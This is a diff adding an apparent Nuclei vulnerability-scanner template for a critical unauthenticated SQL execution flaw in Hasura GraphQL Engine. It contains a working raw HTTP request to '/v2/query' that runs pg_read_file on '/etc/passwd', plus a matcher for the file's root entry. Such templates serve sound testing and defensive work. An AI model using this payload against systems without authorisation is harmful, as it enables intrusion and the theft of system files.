@@ -1,0 +1,46 @@
+id: hasura-graphql-psql-exec
+
+info:
+  name: Hasura GraphQL Engine - Remote Code Execution
+  author: Udyz
+  severity: critical
+  description: Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).
+  reference:
+    - https://www.exploit-db.com/exploits/49802
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: graphql,edb,hasura,rce
+
+http:
+  - raw:
+      - |
+        POST /v2/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "type": "bulk",
+          "source": "default",
+          "args":[
+            {
+              "type": "run_sql",
+              "args": {
+                "source":"default",
+                "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
+                "cascade": false,
+                "read_only": false
+              }
+            }
+          ]
+        }
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+# digest: 4b0a00483046022100846932c710414781189cb5c294b504f44622db0d76f615fd5d0a3f02f1750974022100809c7e669e6073bb7c1a5fac5bb413555257f109190aeb59bb9e5d2c7e58f8dd:922c64590222798bb761d5b6d8e72950
